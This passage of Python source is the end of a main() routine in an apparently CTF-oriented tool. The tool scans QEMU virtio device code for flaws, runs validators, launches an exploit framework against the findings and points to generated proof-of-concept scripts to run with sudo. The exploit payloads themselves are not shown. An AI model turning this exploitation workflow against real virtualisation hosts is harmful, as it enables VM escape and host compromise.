        version = None if args.download_qemu == 'auto' else args.download_qemu
        downloaded = QEMUFinder.download_source(version)
        
        if downloaded:
            args.qemu_src = str(downloaded)
        
        if not has_static and not has_exploit:
            return
    
    # Static analysis
    scan_result = None
    exploitation_performed = False
    
    if args.load_scan:
        # Load previous scan results
        print(f"\n{C.B}[*]{C.E} Loading scan results from {args.load_scan}")
        try:
            with open(args.load_scan) as f:
                data = json.load(f)
                findings = [Finding(**f) for f in data['findings']]
                scan_result = ScanResult(
                    device=data['device'],
                    files_scanned=data['files_scanned'],
                    findings=findings,
                    timestamp=data['timestamp']
                )
                print(f"{C.G}[+]{C.E} Loaded {len(findings)} findings")
        except Exception as e:
            print(f"{C.R}[-]{C.E} Failed to load scan: {e}")
            return
    
    elif has_static and not args.exploit_device:
        qemu_src = args.qemu_src
        
        if not qemu_src:
            print(f"\n{C.B}[*]{C.E} No --qemu-src specified, searching...")
            found = QEMUFinder.find_or_download()
            if found:
                qemu_src = str(found)
            else:
                print(f"{C.R}[-]{C.E} Cannot run static analysis without QEMU source")
                if not has_exploit:
                    return
        
        if qemu_src and os.path.exists(qemu_src):
            scanner = StaticScanner(qemu_src)
            
            if args.scan:
                scan_result = scanner.scan_device(args.scan)
                scanner.print_report(scan_result)
                
                # Save JSON
                if args.output:
                    json_file = args.output
                else:
                    json_file = f"{args.scan}_findings.json"
                
                with open(json_file, 'w') as f:
                    json.dump(scan_result.to_dict(), f, indent=2)
                print(f"\n{C.G}[+]{C.E} Saved to {json_file}")
                
                # If exploiting, run appropriate validator
                if args.exploit:
                    priority_devices = ['virtio-gpu', 'virtio-net', 'virtio-blk', 'virtio-scsi']
                    
                    print(f"\n{C.M}{'='*70}{C.E}")
                    print(f"{C.M}RUNNING VALIDATION{C.E}")
                    print(f"{C.M}{'='*70}{C.E}\n")
                    
                    # Use enhanced validator for priority devices
                    if args.scan in priority_devices and os.path.exists('./enhanced_validator.py'):
                        print(f"{C.CY}[*]{C.E} Using enhanced device-specific validator for {args.scan}")
                        print(f"{C.CY}[*]{C.E} This tests actual device operations (MMIO, virtio commands)")
                        print()
                        
                        validator_cmd = [
                            sys.executable,
                            './enhanced_validator.py',
                            '--device', args.scan,
                            '--target-addr', hex(target_addr)
                        ]
                    else:
                        print(f"{C.CY}[*]{C.E} Using standard validator for {args.scan}")
                        print()
                        
                        validation_file = f"{args.scan}_validation.json"
                        
                        validator_cmd = [
                            sys.executable,
                            './poc_validator.py',
                            json_file,
                            '--target-addr', hex(target_addr),
                            '--output', validation_file,
                            '--device', args.scan
                        ]
                    
                    try:
                        subprocess.run(validator_cmd, timeout=300)
                        
                        print(f"\n{C.G}[+]{C.E} Validation complete")
                        
                        # List generated POCs
                        poc_files = sorted([f for f in os.listdir('.') if f.startswith('poc_') and f.endswith('.py')])
                        if poc_files:
                            print(f"\n{C.G}[+]{C.E} Generated POC files:")
                            for poc in poc_files:
                                print(f"    â€¢ {poc}")
                            print(f"\n{C.CY}Run with:{C.E} sudo ./{poc_files[0]}")
                        
                        print(f"\n{C.CY}[*]{C.E} Check dmesg for CTF output:")
                        print(f"    sudo dmesg | tail -20")
                        
                    except subprocess.TimeoutExpired:
                        print(f"{C.R}[-]{C.E} Validation timed out")
                    except Exception as e:
                        print(f"{C.R}[-]{C.E} Validation failed: {e}")
            
            elif args.scan_all:
                all_results = scanner.scan_all()
                
                print(f"\n{C.M}{'='*70}{C.E}")
                print(f"{C.M}SAVING INDIVIDUAL FINDINGS{C.E}")
                print(f"{C.M}{'='*70}{C.E}\n")
                
                # Save individual JSON files for each device
                saved_files = []
                for device, result in all_results.items():
                    if result.findings:
                        json_file = f"{device}_findings.json"
                        with open(json_file, 'w') as f:
                            json.dump(result.to_dict(), f, indent=2)
                        print(f"{C.G}[+]{C.E} {json_file} ({len(result.findings)} findings)")
                        saved_files.append((device, json_file, result))
                
                print(f"\n{C.G}[+]{C.E} Saved {len(saved_files)} device findings files\n")

                # Write combined report.json with a summary
                try:
                    save_report_json(all_results, report_file='report.json')
                except Exception as e:
                    print(f"{C.Y}[!]{C.E} Could not write combined report.json: {e}")

                # If exploit requested, run exploitation on each saved device result
                if args.exploit and tester and tester.is_available():
                    print(f"\n{C.M}{'='*70}{C.E}")
                    print(f"{C.M}RUNNING EXPLOITS ON SAVED SCAN RESULTS{C.E}")
                    print(f"{C.M}{'='*70}{C.E}\n")
                    framework = ExploitFramework(tester, target_addr)
                    for device, result in all_results.items():
                        if result.findings:
                            print(f"{C.B}[*]{C.E} Exploiting results for {device} ({len(result.findings)} findings)")
                            framework.exploit_scan_results(result)
                    exploitation_performed = True
                
                # If exploiting, run enhanced validator on priority devices
                if args.exploit:
                    print(f"{C.M}{'='*70}{C.E}")
                    print(f"{C.M}RUNNING ENHANCED DEVICE-SPECIFIC VALIDATION{C.E}")
                    print(f"{C.M}{'='*70}{C.E}\n")
                    
                    # Priority devices that support device-specific exploitation
                    priority_devices = ['virtio-gpu', 'virtio-net', 'virtio-blk', 'virtio-scsi']
                    
                    # Devices to validate with enhanced validator
                    devices_to_validate = []
                    for device, json_file, result in saved_files:
                        critical = result.get_critical()
                        if not critical:
                            print(f"{C.Y}[!]{C.E} Skipping {device} (no critical findings)\n")
                            continue
                        devices_to_validate.append(device)
                    
                    if devices_to_validate:
                        # Check if enhanced_validator.py exists
                        if os.path.exists('./enhanced_validator.py'):
                            print(f"{C.CY}[*]{C.E} Using enhanced device-specific validator")
                            print(f"{C.CY}[*]{C.E} This tests actual device operations (MMIO, virtio commands)")
                            print()
                            
                            # Run enhanced validator for all devices at once
                            validator_cmd = [
                                sys.executable,
                                './enhanced_validator.py',
                                '--all',
                                '--target-addr', hex(target_addr)
                            ]
                            
                            try:
                                print(f"{C.B}[*]{C.E} Running enhanced validation on {len([d for d in devices_to_validate if d in priority_devices])} priority devices...\n")
                                
                                result = subprocess.run(
                                    validator_cmd,
                                    capture_output=False,
                                    timeout=600  # 10 minutes for all devices
                                )
                                
                                # After enhanced validator runs, summarize
                                print(f"\n{C.M}{'='*70}{C.E}")
                                print(f"{C.M}ENHANCED VALIDATION COMPLETE{C.E}")
                                print(f"{C.M}{'='*70}{C.E}\n")
                                
                            except subprocess.TimeoutExpired:
                                print(f"{C.R}[-]{C.E} Enhanced validation timed out")
                            except Exception as e:
                                print(f"{C.R}[-]{C.E} Enhanced validation error: {e}")
                                print(f"{C.Y}[!]{C.E} Falling back to standard validator...")
                        else:
                            print(f"{C.Y}[!]{C.E} Enhanced validator not found, using standard validator")
                            print(f"{C.CY}    Create it with the provided enhanced_validator.py{C.E}\n")
                        
                        # Also run standard validator on non-priority devices
                        non_priority = [d for d in devices_to_validate if d not in priority_devices]
                        
                        if non_priority and os.path.exists('./poc_validator.py'):
                            print(f"\n{C.B}[*]{C.E} Running standard validator on {len(non_priority)} other devices...\n")
                            
                            for device in non_priority:
                                json_file = f"{device}_findings.json"
                                
                                validator_cmd = [
                                    sys.executable,
                                    './poc_validator.py',
                                    json_file,
                                    '--target-addr', hex(target_addr),
                                    '--output', f"{device}_validation.json",
                                    '--device', device
                                ]
                                
                                try:
                                    subprocess.run(validator_cmd, capture_output=False, timeout=300)
                                except:
                                    pass
                        
                        # Print final summary
                        print(f"\n{C.M}{'='*70}{C.E}")
                        print(f"{C.M}VALIDATION SUMMARY{C.E}")
                        print(f"{C.M}{'='*70}{C.E}\n")
                        
                        print(f"{C.CY}Files created:{C.E}")
                        print(f"  â€¢ Findings: {len(saved_files)} device JSON files")
                        print(f"  â€¢ Enhanced validation: priority virtio devices")
                        print(f"  â€¢ Standard validation: other devices")
                        print()
                        
                        # List any generated POCs
                        poc_files = sorted([f for f in os.listdir('.') if f.startswith('poc_') and f.endswith('.py')])
                        if poc_files:
                            print(f"{C.G}[+]{C.E} Generated POC files:")
                            for poc in poc_files:
                                print(f"    â€¢ {poc}")
                            print(f"\n{C.CY}Run with:{C.E} sudo ./{poc_files[0]}")
                        else:
                            print(f"{C.Y}[!]{C.E} No POC files generated")
                            print(f"{C.CY}    Check validation output above for confirmed vulnerabilities{C.E}")
                        
                        print()
                    
                else:
                    # Just print reports
                    for device, result in all_results.items():
                        if result.findings:
                            scanner.print_report(result)
    
    # Exploitation
    if has_exploit and tester and tester.is_available():
        framework = ExploitFramework(tester, target_addr)
        
        if scan_result:
            # Exploit scan results
            framework.exploit_scan_results(scan_result)
        
        elif args.exploit_device:
            # Exploit without prior scan
            print(f"\n{C.Y}[!]{C.E} Exploiting {args.exploit_device} without scan")
            print(f"{C.Y}[!]{C.E} This will use generic exploitation strategies")
            
            # Create dummy findings for the device
            dummy_result = ScanResult(
                device=args.exploit_device,
                files_scanned=0,
                findings=[
                    Finding(
                        file=f"hw/{args.exploit_device}/unknown.c",
                        line=0,
                        risk_score=100,
                        type="use_after_free",
                        function="unknown"
                    )
                ]
            )
            
            framework.exploit_scan_results(dummy_result)
        
        # Show final results
        if framework.results:
            print(f"\n{C.M}{'='*70}{C.E}")
            print(f"{C.M}FINAL EXPLOITATION RESULTS{C.E}")
            print(f"{C.M}{'='*70}{C.E}\n")
            
            successes = [r for r in framework.results if r.success]
            failures = [r for r in framework.results if not r.success]
            
            print(f"{C.G}Successful: {len(successes)}{C.E}")
            print(f"{C.R}Failed: {len(failures)}{C.E}\n")
            
            if successes:
                print(f"{C.G}SUCCESSFUL EXPLOITS:{C.E}\n")
                for r in successes:
                    print(r)
            
            # Check dmesg for flags
            print(f"\n{C.CY}Checking dmesg for CTF output...{C.E}")
            try:
                result = subprocess.run(['dmesg', '|', 'tail', '-20'], 
                                      capture_output=True, text=True, 
                                      shell=True, timeout=5)
                print(result.stdout)
            except:
                print(f"{C.Y}[!]{C.E} Could not read dmesg")
    
    # Cleanup
    if tester:
        tester.close()

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{C.Y}[!]{C.E} Interrupted")
        sys.exit(1)
    except Exception as e:
        print(f"\n{C.R}[!]{C.E} Error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)